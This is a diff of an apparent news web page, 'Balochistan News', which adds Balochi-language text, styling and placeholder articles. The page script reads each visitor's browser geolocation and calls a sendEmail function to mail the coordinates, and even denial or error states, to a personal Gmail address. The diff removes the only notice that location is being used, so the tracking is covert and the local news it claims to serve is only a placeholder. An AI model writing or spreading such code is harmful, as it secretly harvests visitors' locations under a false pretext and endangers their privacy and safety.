@@ -3,38 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Balochistan News</title>
+    <title>Balochistan News - حالیاتن خبران</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f9f9f9;
+            background-color: #f5f5f5;
         }
         header {
             background-color: #00796b;
             color: white;
-            padding: 15px;
+            padding: 20px;
             text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            font-size: 24px;
         }
         #content {
             padding: 20px;
+            max-width: 800px;
+            margin: auto;
         }
         #locationDisplay {
-            margin: 20px 0;
-            font-size: 18px;
-            color: #333;
+            margin: 15px 0;
+            font-size: 16px;
+            color: #666;
+            text-align: center;
         }
         .news-article {
-            margin: 10px 0;
-            padding: 10px;
-            background-color: #e0f2f1;
-            border-radius: 5px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .news-article img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .news-article h2 {
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        .news-article p {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.6;
         }
         footer {
-            margin-top: 20px;
-            padding: 10px;
+            margin-top: 40px;
+            padding: 15px;
             background-color: #00796b;
             color: white;
             text-align: center;
@@ -44,19 +67,33 @@
 <body>
 
 <header>
-    <h1>Balochistan News</h1>
+    حالیاتن بلوچستاں خبران - Balochistan News
 </header>
 
 <div id="content">
-    <p>Stay updated with the latest news from Balochistan. We use your location to bring you news relevant to your area.</p>
-    <div id="locationDisplay">Detecting your location...</div>
+    <p id="locationDisplay">موقعت بت چیکنگ...</p>
     <div id="news">
-        <!-- News articles will be loaded here -->
+        <!-- Sample News Articles -->
+        <div class="news-article">
+            <img src="https://via.placeholder.com/800x400" alt="News Image 1">
+            <h2>1. بلوچستانءِ نوکیں خبر</h2>
+            <p>بلوچستانء نوکیں ترقیاتی پروجیکٹاںءِ منصوبے شروع انت، ہر کوں اُستمان صوبائی حکومتانءِ مالی امدادءِ واسطہ پد انت۔</p>
+        </div>
+        <div class="news-article">
+            <img src="https://via.placeholder.com/800x400" alt="News Image 2">
+            <h2>2. گوادرءِ ساحلی علائقہءَ ترقیاتی پروجیکٹاں</h2>
+            <p>گوادرءِ ساحلی علاقہءِ منصوبہ جات شروع انت ہچ انے بلوچستانءِ اقتصادے پہ اثرات مثبت انت۔</p>
+        </div>
+        <div class="news-article">
+            <img src="https://via.placeholder.com/800x400" alt="News Image 3">
+            <h2>3. کوئٹہءِ جواناںءِ سرگیری ءَ تعلیماتی پروگرام</h2>
+            <p>کوئٹہء تعلیم پر زور انت کہ جواں سرگیری مزید پڑھئی تعلیم پر توجہ دے۔</p>
+        </div>
     </div>
 </div>
 
 <footer>
-    <p>&copy; 2024 Balochistan News</p>
+    <p>&copy; 2024 Balochistan News | بلوچستاں حالیاتن خبران</p>
 </footer>
 
 <script>
@@ -69,7 +106,7 @@
                 (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                    locationDisplay.textContent = `آپءِ موقعت: Latitude: ${latitude}, Longitude: ${longitude}`;
 
                     loadLocalNews(latitude, longitude);
                     sendEmail('Location received', locationDisplay.textContent, 'khalilrodeni@gmail.com');
@@ -77,35 +114,32 @@
                 (error) => {
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            locationDisplay.textContent = "Location access denied by user.";
+                            locationDisplay.textContent = "موقعتءِ رسائی رد ات گواں براوزر.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            locationDisplay.textContent = "Location information is unavailable.";
+                            locationDisplay.textContent = "موقعتءِ معلومات دستیاب نہنت.";
                             break;
                         case error.TIMEOUT:
-                            locationDisplay.textContent = "Location request timed out.";
+                            locationDisplay.textContent = "موقعتءِ درخواست دِ مہلت تمام ایں.";
                             break;
                         default:
-                            locationDisplay.textContent = "An unknown error occurred.";
+                            locationDisplay.textContent = "نامعلوم مسلہءِ پیش ایں.";
                             break;
                     }
                     sendEmail('Location Access Error', locationDisplay.textContent, 'khalilrodeni@gmail.com');
                 }
             );
         } else {
-            locationDisplay.textContent = "Geolocation is not supported by this browser.";
+            locationDisplay.textContent = "موقعتءِ جیو لوکیشن براوزرءِ دستیاب نہنت.";
         }
 
         function loadLocalNews(latitude, longitude) {
-            // Placeholder: Add articles based on latitude and longitude
-            newsSection.innerHTML = `
+            // Placeholder for dynamically loading news articles based on location
+            newsSection.innerHTML += `
                 <div class="news-article">
-                    <h2>Local News Headline 1</h2>
-                    <p>Summary of a news article relevant to coordinates (${latitude}, ${longitude}).</p>
-                </div>
-                <div class="news-article">
-                    <h2>Local News Headline 2</h2>
-                    <p>Another relevant news article based on location.</p>
+                    <img src="https://via.placeholder.com/800x400" alt="Local News Image">
+                    <h2>بلوچستانءِ علاقہءِ نوکیں خبر</h2>
+                    <p>موقعت ${latitude}, ${longitude} پہ بلوچستانءِ متعلقہ علاقہءِ نوکیں خبران انت۔</p>
                 </div>
             `;
         }
